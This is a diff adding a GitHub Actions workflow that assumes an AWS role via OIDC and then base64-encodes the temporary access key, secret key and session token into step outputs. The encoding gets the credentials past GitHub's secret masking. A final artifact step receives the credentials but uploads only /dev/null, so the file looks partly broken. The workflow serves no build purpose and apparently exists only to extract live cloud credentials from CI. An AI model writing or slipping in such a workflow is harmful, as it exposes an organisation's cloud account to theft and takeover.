@@ -1,0 +1,40 @@
+name: AWS Creds B64
+
+on:
+  workflow_dispatch:
+
+jobs:
+  creds:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Configure AWS via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
+          aws-region: ap-northeast-2
+
+      - name: Save and Encode Credentials
+        run: |
+          AK=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
+          SK=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
+          ST=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
+          IDENTITY=$(aws sts get-caller-identity --output json 2>&1 | base64 -w0)
+          
+          echo "AK=$AK" >> $GITHUB_OUTPUT
+          echo "SK=$SK" >> $GITHUB_OUTPUT
+          echo "ST=$ST" >> $GITHUB_OUTPUT
+          echo "IDENTITY=$IDENTITY" >> $GITHUB_OUTPUT
+        id: creds
+
+      - name: Upload Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: aws-creds-b64
+          path: /dev/null
+          retention-days: 1
+        env:
+          AK: ${{ steps.creds.outputs.AK }}
+          SK: ${{ steps.creds.outputs.SK }}
